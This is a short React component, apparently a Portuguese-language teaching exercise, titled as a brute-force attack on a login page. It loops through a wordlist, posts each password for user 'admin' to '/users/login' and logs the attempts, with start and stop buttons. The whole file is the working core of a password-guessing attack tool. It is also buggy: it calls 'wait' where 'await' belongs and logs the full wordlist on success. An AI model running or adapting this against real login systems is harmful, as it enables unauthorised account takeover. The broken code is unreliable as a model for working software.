import wordlist from "../data/wordlist"




let stop = false

export default function BruteForce() {
    const [log, setLog] = React.useState([])

    async function tryPassword(password) {
        try{
            await myfetch.post('/users/login', {
                username: 'admin',
                password
            })
            return 'OK'

        }
        catch(error) {
            return error.message
        }
        
    }

    async function handleStartClick(event) {
        event.target.disabled =true
        stop = false
        for (let i = 0; i < wordlist.length; i++){
            if (stop) break
            let result = wait(tryPassword(wordlist[i]))
            if (result === 'OK') {
                setLog(`SENHA ENCONTRADA, tentativa ${i}: ${wordlist}`)
                stop = true
                break
            }
            else {
                setLog(`Tentativa n° ${i}(${wordlist[i]}) => ${result}`)

            }
            setTimeout(() => setLog('----parado----'), 50)
        
        }
        event.target.disabled = false
    }

    return<>
    <h1>Ataque de força bruta no <em>login</em></h1>
    <div style={{
        display: 'flex',
        justifyContent:'space-around'
    }}>
        <button onClick={handleStartClick}>
            Iniciar
        </button>
        <button onClick={() => stop = true} disabled={stop}>
           Parar
        </button>

        
    </div>
    <div style={{ fontFamily: 'monospace'}}>
            {log}
    </div>
    </>
}